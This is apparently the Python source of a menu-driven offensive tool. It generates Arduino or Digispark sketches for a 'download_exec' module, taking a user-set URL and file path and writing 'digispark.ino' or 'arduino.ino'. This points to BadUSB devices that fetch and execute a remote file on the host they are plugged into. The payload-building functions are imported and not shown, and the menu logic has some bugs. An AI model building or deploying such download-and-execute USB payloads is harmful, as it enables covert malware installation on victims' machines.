from colorama import Fore
import sys
from module.function import Digispark, Arduino, check
from module.banner import ASCII
from time import sleep

# Lists
plat=[]
url=[]
path=[]

def main():
    print("by: "+Fore.LIGHTBLUE_EX+"@WR117H"+Fore.RESET+" | version: "+Fore.LIGHTMAGENTA_EX+"1.0"+Fore.LIGHTGREEN_EX+" main"+Fore.RESET)
    global plat
    global url
    global path
    while True:
        
       platform = input(Fore.LIGHTBLUE_EX+"\033[4mdi1\033[0m"+Fore.RESET+" > ").lower()
       if platform.startswith("set"):
          if platform[4:11] == "arduino":
             if len(plat) == 0:
                plat.append("arduino")
             else:
                del plat[0] 
                plat.append("arduino")
          elif platform[4:13] == "digispark":
             if len(plat) == 0:
                plat.append("digispark")  
             else:
                del plat[0] 
                plat.append("digispark")                
          else:
             print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"the platform "+"["+Fore.LIGHTYELLOW_EX+f"{platform[4:]}"+Fore.RESET+"]"+" was not found or failed to import.")
       elif platform.startswith("exit"):
          exit(0)
       elif platform.startswith("show"):
          if platform[5:13] == "platform":
             if len(plat) == 0:
                print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"Haven't selected any platforms")
             else:
                print(str(plat[0]))
          else:
            print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"the module "+"["+Fore.LIGHTYELLOW_EX+f"{platform[5:]}"+Fore.RESET+"]"+" was not found or failed to import.")
       elif platform.startswith("use"):
          if len(plat) == 0:
            print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"set the platform")  
          else:
            if platform[4:10]=="module":
                plat=plat[0]
                if platform[10:24] == "/download_exec":
                    if len(plat) != None:                        
                        while True:
                            platform = input("di1 : "+Fore.LIGHTBLUE_EX+"\033[4mdownload_exec\033[0m"+Fore.RESET+" > ")
                            if platform.startswith("set"):
                                if platform[4:7] == "url":
                                    if len(url) == 0:
                                        url.append(platform[8:])
                                    else:
                                        del url[0]  
                                        url.append(platform[8:])

                                elif platform[4:8] == "path":
                                    if len(path) == 0:
                                        path.append(platform[9:])
                                    else:
                                        del path[0] 
                                        path.append(platform[9:])
                            elif platform.startswith("show"):
                                if platform[5:13] == "platform":
                                    print(str(plat))
                                elif platform[5:8]=="url":
                                    if len(url) == 0:
                                        print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"Haven't entred any url")
                                    else:
                                        print(url[0])
                                elif platform[5:9]=="path":
                                    if len(path) == 0:
                                        print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"Haven't entred any path")
                                    else:
                                        print(path[0])
                            elif platform.startswith("run"):
                                if len(path) > 0 and len(url) > 0:
                                    # Convert the user input to an integer (milliseconds should be a whole number)
                                    MAIN_DELAY = 2500
                                    DEFAULT_DELAY = 750
                                    url = url[0]
                                    file_path = path[0].replace('/', '\\\\')    
                                    if plat == "digispark":
                                        platform="digispark"

                                        check(f"Generating the script for {platform} ")
                                        script = Digispark(url, file_path,DEFAULT_DELAY, MAIN_DELAY)
                                        sleep(1)
                                        file_name = "digispark.ino"
                                        with open(file_name, "w") as f:
                                            f.write(script)        

                                        check(f"Generated the script for {platform} in {file_name}")
                                    elif plat == "arduino":
                                        platform="arduino"
                                        check(f"Generating the script for {platform} ")
                                        script = Arduino(url, file_path, DEFAULT_DELAY, MAIN_DELAY)
                                        sleep(1)
                                        file_name = "arduino.ino"
                                        with open(file_name, "w") as f:
                                            f.write(script) 
                                        check(f"Generated the script for {platform} in {file_name}")
                                elif platform.startswith("exit"):
                                    exit(0)
                                else:
                                    print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"set path and url")    
                            elif platform.startswith("back"):
                                break                                                                               
                    else:
                        print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"please select a platform such as arduino and digispark ")
            else:
                print(Fore.LIGHTRED_EX+"[-] "+Fore.RESET+"the module "+"["+Fore.LIGHTYELLOW_EX+f"{platform[11:]}"+Fore.RESET+"]"+" was not found or failed to import.")
       else:
          print(Fore.LIGHTRED_EX+"[-]"+Fore.RESET+" di1: command not found: "+platform)

if __name__ == "__main__":
    ASCII()
    main()
